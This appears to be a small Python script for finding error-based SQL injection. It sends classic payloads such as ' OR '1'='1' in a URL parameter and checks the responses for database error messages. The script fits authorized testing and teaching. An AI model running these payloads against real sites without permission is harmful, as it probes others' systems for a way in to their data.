import argparse
import requests
import sys

# common SQL error signatures to look for in response
SQL_ERRORS = [
    "you have an error in your sql syntax;",
    "warning: mysql;",
    "unclosed quotation mark after the character string",
    "quoted string not properly terminated",
    "pg_query()",
    "sqlite3.OperationalError"
]

def test_sql_injection(url, param):
    print("\n" + "="*50)
    print("      AUTOMATED SQL INJECTION SCANNER (SQL_INJECTOR)       ")
    print("="*50)
    print(f"[*] Target URL       : {url}")
    print(f"[*] Testing parameter: {param}")
    print("="*50 + "\n")

    # payloads to test basic error-based SQLi
    payloads = ["'", "\"", "' OR '1'='1'", "\" OR \"1\"=\"1"]

    vulnerable = False

    for payload in payloads:
        # constructing test URL or parameter dictionary
        # appending payload to the parameter value
        test_url = f"{url}?{param}=1{payload}"
        print(f"[*] Testing Payloads: {payload}")

        try:
            response = requests.get(test_url, timeout=5)

            # checking for database error signatures in the body
            body_text = response.text.lower()
            for error in SQL_ERRORS:
                if error in body_text:
                    print(f"[!] VULNERABILITY FOUND! Parameter '{param} triggered error signature: '{error}'")
                    print(f"    Triggering URL: {test_url}")
                    vulnerable = True
                    break

        except requests.exceptions.RequestException as e:
            print(f"[-] Connection error: {e}")

    if not vulnerable:
        print("\n[-] Scan complete. No immediate standard SQL error signatures detected.")
    else:
        print("\n[+] Scan complete. Potential vulnerabilities identified!")

def main():
    parser = argparse.ArgumentParser(description="Automated SQL Injection Scanner")
    parser.add_argument("-u", "--url", required=True, help="Target base URL (e.g., http://localhost/vulnerable_site/page.php)")
    parser.add_argument("-p", "--param", required=True, help="Vulnerable parameter name to test (e.g., id)")

    args = parser.parse_args()
    test_sql_injection(args.url, args.param)

if __name__ == "__main__":
    main()